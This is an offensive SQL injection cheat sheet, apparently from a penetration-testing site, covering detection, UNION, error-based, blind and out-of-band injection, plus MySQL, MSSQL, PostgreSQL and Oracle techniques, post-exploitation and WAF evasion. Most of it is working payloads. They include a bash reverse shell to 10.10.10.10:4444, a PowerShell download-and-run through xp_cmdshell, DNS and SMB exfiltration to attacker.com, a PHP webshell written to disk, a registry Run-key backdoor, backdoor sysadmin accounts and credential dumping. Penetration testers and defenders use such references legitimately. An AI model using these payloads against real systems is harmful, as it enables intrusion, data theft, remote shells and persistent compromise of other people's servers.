# SQL Injection

**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries that an  application makes to its database. It enables attackers to view, modify, or delete data they are not normally able to access.

SQL injection occurs when an application builds SQL queries by  concatenating strings that include user-supplied data. When this input  isn't properly sanitized, attackers can modify the query's logic. For  example, in the query:

```sql
SELECT * FROM users WHERE username = 'input' AND password = 'input'
```

An attacker might input: `admin' --`, changing the query to:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'input'
```

This commenting out the password check entirely.

## Detection

### Manual Testing

#### Quote Tests

Tests for SQL parsing errors by injecting different types of quotes:

```sql
# Quote tests - Testing for SQL parsing errors
username'   # Single quote - Most common SQL injection test
username"   # Double quote - Used in some database types
username`   # Backtick - Mainly for MySQL identifier injection
```

#### Logic Tests

Verifies query manipulation possibilities through boolean logic:

```sql
username' OR '1'='1   # Always true condition, often bypasses authentication
username' AND '1'='2  # Always false condition, verifies boolean responses
username' WAITFOR DELAY '0:0:5'--  # Time-based test, checks for blind injection
```

#### Error Tests

Forces database errors to gather information about the backend:

```sql
username' AND 1=convert(int,@@version)--       # Forces type conversion error, reveals MSSQL version
username' AND 1=cast((SELECT @@version) as int)--  # Alternative version check for MSSQL
```

### Scanning with SQLMap

To learn how to use SQLMap in detail, you can go to our related tactic page by [click here](https://hackviser.com/tactics/tools/sqlmap).

#### SQLMap basic scan

```bash
sqlmap -u "http://target.com" 
```

#### SQLMap basic scan with crawling

```bash
sqlmap -u "http://target.com" --crawl=3 --batch --forms
# --crawl=3: Crawls the website up to 3 levels deep
# --batch: Never asks for user input, uses default responses
# --forms: Automatically tests all forms found
```

#### SQLMap scan with request file

```bash
sqlmap -r login-request.txt --level=5 --risk=3 --batch
# --level=5: Most through testing level (default is 1)
# --risk=3: Includes risky tests that could potentially cause problems (default is 1)
```

#### SQLMap advanced options for specific scenarios

```bash
sqlmap -u "http://target.com/api/endpoint" \
  --headers="Authorization: Bearer xxx" \  # Custom HTTP headers for API testing
  --technique=BEUSTQ \  # Use all techniques: Boolean, Error, Union, Stacked, Time, Query
  --dbms=mysql \        # Specify database type for more efficient testing
  --threads=10 \        # Parallel threads for faster scanning
  --tamper=space2comment,between  # Evade WAF by using comment instead of spaces and BETWEEN operator
```

### Scanning with Nuclei

```bash
nuclei -u "http://target.com" -t sqli/ -severity critical
# Scans target using Nuclei's SQL injection templates
# -severity critical: Only runs critical severity checks
```

## Attack Vectors

### UNION Based Injection

UNION-based attacks allow combining the results of two queries. First step is finding the correct number of columns:

```sql
# Column number enumeration - Finding number of columns in original query
' ORDER BY 1--  # Tests if 1 column exists
' ORDER BY 2--  # Tests if 2 columns exist
# Continue incrementing until error occurs, revealing column count

# Alternative column enumeration using UNION
' UNION SELECT NULL--       # Tests for 1 column
' UNION SELECT NULL,NULL--  # Tests for 2 columns
# NULL values are used because they can convert to any data type

# Data extraction after finding column count
' UNION SELECT username,password FROM users--  
# Direct extraction of user credentials when 2 columns are confirmed

' UNION SELECT table_name,NULL FROM information_schema.tables--
# Lists all tables in database, NULL to match column count

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
# Lists all columns in users table
```

### Error Based Injection

Error-based injections extract data through database error messages. These are  particularly useful when you can see error output.

```sql
# MySQL error-based extraction
# Uses GROUP BY and RAND() to force a duplicate key error containing our data
AND (SELECT 6062 FROM(
    SELECT COUNT(*),
    CONCAT(0x716b627071,     # Prefix hex marker
        (SELECT version()),   # Data we want to extract
        0x7178707871,        # Suffix hex marker
        FLOOR(RAND(0)*2))x   # Forces the error
    FROM INFORMATION_SCHEMA.PLUGINS 
    GROUP BY x)a)

# Similar technique but extracting database name
AND (SELECT 2067 FROM (
    SELECT COUNT(*),
    CONCAT(0x716b627071,
        (SELECT database()),  # Extracts current database name
        0x7178707871,
        FLOOR(RAND(0)*2))x 
    FROM INFORMATION_SCHEMA.PLUGINS 
    GROUP BY x)a)

# MSSQL Time-based data extraction
# Uses IF statement with WAITFOR to check conditions
'; IF (SELECT system_user) = 'sa' WAITFOR DELAY '0:0:5'--
# Delays response by 5 seconds if current user is 'sa'

';IF (SELECT COUNT(name) FROM sysobjects WHERE name = 'sometable')>0 WAITFOR DELAY '0:0:5'--
# Delays response if table 'sometable' exists
```

### Blind SQLi

Extracting data through boolean/time responses:

```sql
# Boolean based
' AND (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5)='x'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

# Time based
' AND IF(LENGTH(database())>1,SLEEP(5),'false')--
' WAITFOR DELAY '0:0:5'--
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE LENGTH(table_name)=6 AND table_schema=database())=1 AND SLEEP(5)--
```

### Out-of-band SQLi

Extracting data through external channels:

```sql
# DNS exfiltration (MySQL)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\abc'))-- -

# HTTP request (MSSQL)
'; exec master..xp_dirtree '//attacker.com/'; --
```

### Database Specific Techniques

#### MySQL

```sql
# File operations
SELECT LOAD_FILE('/etc/passwd');          # Reads server files into query results
SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/shell.php';  # Writes webshell to server

# System information gathering
SELECT @@version;        # Database version
SELECT @@datadir;        # Data directory location
SELECT @@hostname;       # Server hostname
SELECT @@plugin_dir;     # Plugin directory location
SELECT USER();          # Current database user
SELECT CURRENT_USER();  # Current system user

# User defined functions (UDF) for command execution
# First create evil UDF library
SELECT binary 0x[hex of udf library] INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';
# Then create function
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';
# Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1');

# Privilege escalation
SELECT grantee, privilege_type FROM information_schema.user_privileges;  # List user privileges
SELECT host, user, authentication_string FROM mysql.user;               # List user credentials
```

#### MSSQL

```sql
# Command execution via xp_cmdshell
EXEC sp_configure 'show advanced options', 1;  # Enable advanced options
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;           # Enable xp_cmdshell
RECONFIGURE;
EXEC xp_cmdshell 'whoami';                    # Execute commands
EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/rev.ps1")';

# File operations
# Access SMB share
EXEC xp_dirtree '\\10.10.10.10\share';
# Backup database to attacker's share
BACKUP DATABASE master TO DISK = '\\10.10.10.10\share\backup.bak';

# Registry operations
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','backdoor','REG_SZ','C:\backdoor.exe';

# Linked servers abuse
SELECT * FROM OPENQUERY(remote_server, 'SELECT @@version');  # Query linked server
EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT linked_server;  # Enable xp_cmdshell on linked server
```

#### PostgreSQL

```sql
# File operations
CREATE TABLE cmd_exec(cmd_output text);           # Create table for command output
COPY cmd_exec FROM PROGRAM 'whoami';             # Execute command and store output
SELECT * FROM cmd_exec;                          # Read command output

# Large object operations for file reading/writing
SELECT lo_import('/etc/passwd', 12345);          # Import file as large object
SELECT lo_get(12345);                            # Read large object
SELECT lo_export(12345, '/tmp/passwd');          # Export large object to file

# Command execution with extensions
CREATE EXTENSION IF NOT EXISTS dblink;            # Enable dblink
SELECT dblink_connect('host=10.10.10.10 user=postgres password=password');  # Connect to remote server
SELECT dblink_exec('DROP TABLE IF EXISTS cmd_exec');  # Execute commands on remote server

# User defined functions for privilege escalation
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
SELECT system('whoami');                         # Execute system commands
```

#### Oracle

```sql
# File operations via Java
BEGIN
  DBMS_JAVA.endsession;
  EXECUTE IMMEDIATE 'create or replace and resolve java source named "FileReader" as
  import java.io.*;
  public class FileReader {
    public static String readFile(String filename) throws Exception {
      BufferedReader br = new BufferedReader(new FileReader(filename));
      String output = "";
      String line;
      while((line=br.readLine())!=null) { output += line + "\n"; }
      return output;
    }
  }';
END;
/
SELECT DBMS_JAVA.runjava('FileReader.readFile("/etc/passwd")') FROM dual;

# Network operations
SELECT UTL_HTTP.REQUEST('http://10.10.10.10/') FROM dual;  # Make HTTP request
SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual;  # DNS lookup
SELECT UTL_TCP.AVAILABLE('10.10.10.10', 4444) FROM dual;     # Port scan

# Command execution via Java
BEGIN
  DBMS_JAVA.endsession;
  EXECUTE IMMEDIATE 'create or replace and resolve java source named "Shell" as
  public class Shell {
    public static String runCmd(String args) throws java.io.IOException {
      return new java.util.Scanner(Runtime.getRuntime().exec(args).getInputStream()).useDelimiter("\\A").next();
    }
  }';
END;
/
SELECT DBMS_JAVA.runjava('Shell.runCmd("whoami")') FROM dual;

# Privilege escalation
SELECT * FROM USER_ROLE_PRIVS;          # List current user privileges
SELECT * FROM DBA_ROLE_PRIVS;           # List all role privileges
SELECT * FROM ALL_TAB_PRIVS;            # List table privileges
```

## Post-Exploitation

### Enumerate Database Users

```sql
SELECT user,password FROM mysql.user;
SELECT name,password_hash FROM sys.sql_logins;
```

### Find Sensitive Data

```sql
SELECT * FROM information_schema.tables WHERE table_name LIKE '%credit%';
SELECT * FROM information_schema.columns WHERE column_name LIKE '%pass%';
```

### Reading Sensitive Files

```sql
# MySQL
' UNION SELECT LOAD_FILE('/etc/passwd')-- -

# MSSQL
' UNION SELECT * FROM OPENROWSET(BULK 'C:/windows/win.ini', SINGLE_CLOB) AS x-- -
```

### Command Execution

Executing system commands:

```sql
# MySQL
' UNION SELECT sys_exec('whoami')-- -

# MSSQL
'; EXEC xp_cmdshell 'whoami'-- -
```

### Establishing Persistence

Creating backdoor accounts:

```sql
# Create admin user
' UNION SELECT 'EXEC sp_addlogin ''backdoor'', ''password123''; EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin'';'-- -
```

## Bypass Techniques

### Quote Bypass

Used when applications block or filter quote characters (`'` or `"`). These are essential for string-based SQL injection:

```sql
# Standard query that would be blocked:
SELECT * FROM users WHERE username = 'admin'

# Hex encoding - Bypasses quote filters by encoding the entire string
SELECT * FROM users WHERE username=0x61646D696E  # 'admin' in hex
# Useful when: Quotes are completely blocked but hex values are allowed

# Character manipulation - Builds strings without quotes
SELECT CONCAT('a','dmin')  # Builds 'admin' by concatenation
SELECT CHAR(65,68,77,73,78)  # Builds 'ADMIN' using ASCII values
# Useful when: Quotes are filtered but string functions are allowed
```

### Space Bypass

Used when WAFs or filters block spaces. Common in mod_security rules and basic WAFs:

```sql
# Original query with spaces (might be blocked):
SELECT password FROM users WHERE id=1

# Comment-based bypass - Uses SQL comments instead of spaces
SELECT/**/password/**/FROM/**/users/**/WHERE/**/id=1
# Useful when: Spaces are blocked but comments are allowed

# Parentheses method - Eliminates need for spaces
SELECT(password)FROM(users)WHERE(id=1)
# Useful when: Both spaces and comments are filtered

# Line breaks - Uses URL-encoded newlines
SELECT%0Apassword%0AFROM%0Ausers
# Useful when: Basic regex-based filters check for spaces
```

### Filter Bypass

Used when specific keywords are blacklisted. Common in application-level filters:

```sql
# Case variation - Bypasses case-sensitive filters
SeLeCt * fRoM uSeRs  # Many DBMSes are case-insensitive
# Useful when: Filters only check for exact keyword matches

# Alternate keywords - Bypasses keyword blacklists
SELECT -> [ALL, TOP 1]  # Alternative for SELECT
UNION -> [UNION ALL]    # Alternative for UNION
AND -> [&&, AND 1]      # Alternative for AND
# Useful when: Specific keywords are blacklisted but alternatives aren't

# Keyword splitting - Bypasses simple keyword matching
SE%0ALECT -> SELECT
U/**/NION -> UNION
# Useful when: Filters don't account for SQL comments or URL encoding
```

### Multi-Layer Encoding Bypass

Used to confuse WAF parsing mechanisms:

```sql
# Single URL encoding
UNION SELECT -> %55%4E%49%4F%4E%20%53%45%4C%45%43%54

# Double URL encoding
UNION -> %2555%254E%2549%254F%254E

# Unicode encoding
SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054

# Mixed encoding
UNION/*%0ASELECT*/  # Combining comments and URL encoding

# Useful when: WAF only decodes input once or has limited decoding capabilities
```

### Logic Alternative Bypass

Used to avoid common WAF patterns in logical operations:

```sql
# Mathematical operations
WHERE id=1  ->  WHERE id=2-1
WHERE id=1  ->  WHERE id=abs(1)
WHERE id=1  ->  WHERE id=pow(1,1)

# Boolean operations
WHERE id=1  ->  WHERE id BETWEEN 1 AND 1
WHERE id=1  ->  WHERE id IN(1)
WHERE id=1  ->  WHERE id=LEAST(1,1)

# String operations
WHERE name='admin'  ->  WHERE SUBSTR(name,1)='admin'
WHERE name='admin'  ->  WHERE LPAD(name,5)='admin'

# Useful when: WAF blocks simple numeric comparisons or string matches
```

### Unicode Normalization Bypass

Used against WAFs that don't properly handle Unicode characters:

```sql
# Fullwidth character substitution
SELECT -> ＳＥＬＥＣＴ
UNION -> ＵＮＩＯＮ
FROM -> ＦＲＯＭ

# Unicode alternative characters
SELECT -> ＳᵉＬＥＣＴ
UNION -> ＵＮＩＯＮ

# Mixed Unicode and normal characters
SEＬEＣＴ
UＮIＯN

# Useful when: WAF has sophisticated pattern matching but doesn't normalize Unicode input
```

### String Concatenation Bypass

Used to avoid direct keyword detection:

```sql
# Basic concatenation
'SEL'+'ECT'  ->  SELECT
CONCAT('SEL','ECT')  ->  SELECT

# ASCII/CHAR conversion
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))  # SELECT
CONCAT(CHAR(85),CHAR(78),CHAR(73),CHAR(79),CHAR(78))  # UNION

# Hex concatenation
CONCAT(0x53,0x45,0x4C,0x45,0x43,0x54)  # SELECT

# Mixed methods
CONCAT(CHAR(83),0x45,'L','ECT')  # SELECT

# Useful when: WAF has sophisticated pattern matching but doesn't handle string operations
```